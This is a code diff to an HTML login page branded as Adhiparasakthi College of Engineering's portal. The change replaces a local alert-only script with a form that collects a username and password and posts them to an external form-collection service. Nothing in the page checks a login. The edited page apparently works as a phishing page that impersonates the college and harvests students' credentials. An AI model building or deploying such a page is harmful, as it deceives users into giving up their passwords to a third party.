@@ -7,19 +7,13 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
-    * {
-        box-sizing: border-box;
-        font-family: Arial, sans-serif;
-    }
-
     body {
         margin: 0;
         height: 100vh;
         display: flex;
         justify-content: center;
         align-items: center;
-
-        /* clean animated background */
+        font-family: Arial, sans-serif;
         background: linear-gradient(-45deg, #FF9933, #FFFFFF, #138808);
         background-size: 300% 300%;
         animation: bg 8s ease infinite;
@@ -101,18 +95,18 @@
 
 <div class="box">
 
-    <!-- LOGO (must be in same repo as logo.png) -->
-    <img src="logo.png" alt="College Logo" class="logo">
+    <!-- LOGO (must be in repo as logo.png) -->
+    <img src="logo.png" class="logo" alt="College Logo">
 
-    <!-- COLLEGE NAME -->
     <h1>ADHIPARASAKTHI COLLEGE OF ENGINEERING</h1>
-    <h2>Student Login Portal</h2>
+    <h2>Login Portal</h2>
 
-    <!-- SAFE LOGIN FORM (NO BLOCKING) -->
-    <form onsubmit="return loginUser()">
+    <!-- ✅ FORM CARRY CONNECTED -->
+    <form action="https://formcarry.com/s/RLMwi-19fZB" method="POST">
 
-        <input type="text" id="username" placeholder="Username" required>
-        <input type="email" id="email" placeholder="Email" required>
+        <input type="text" name="username" placeholder="Username" required>
+
+        <input type="password" name="password" placeholder="Password" required>
 
         <button type="submit">Login</button>
     </form>
@@ -122,17 +116,6 @@
     </div>
 
 </div>
-
-<script>
-function loginUser() {
-    let user = document.getElementById("username").value;
-    let email = document.getElementById("email").value;
-
-    alert("Login Successful!\nUsername: " + user);
-
-    return false; // prevents page reload
-}
-</script>
 
 </body>
 </html>
